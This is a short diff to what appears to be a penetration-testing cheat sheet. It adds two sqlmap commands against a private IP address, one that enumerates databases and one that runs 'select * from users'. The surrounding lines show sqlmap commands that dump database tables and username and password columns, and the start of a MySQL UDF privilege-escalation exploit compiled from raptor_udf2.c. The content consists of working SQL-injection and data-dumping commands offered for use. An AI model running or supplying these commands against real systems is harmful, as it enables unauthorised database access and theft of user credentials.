@@ -54,6 +54,8 @@ sqlmap.py -u URL --method POST --data "username=FUZZ&password=" -P username --db
 sqlmap.py -u "http://ip/register/user-check?username=admin" --dbms mysql -D database -T flag --dump
 sqlmap -r request.txt --dbms=mysql --dump
 sqlmap -r lockdown.req --dbms=mysql --dump -T 'users' -D 'cts_db' -C 'username,password'
+sqlmap -u "http://192.168.1.100/section.php" --data "id=50&pass=1234" --dbs --threads 10 
+sqlmap -u "http://192.168.1.100/section.php?id=51" --sql-query="select * from users"
 
 # mysql (UDFs exploit):
 gcc -g -c raptor_udf2.c -fPIC
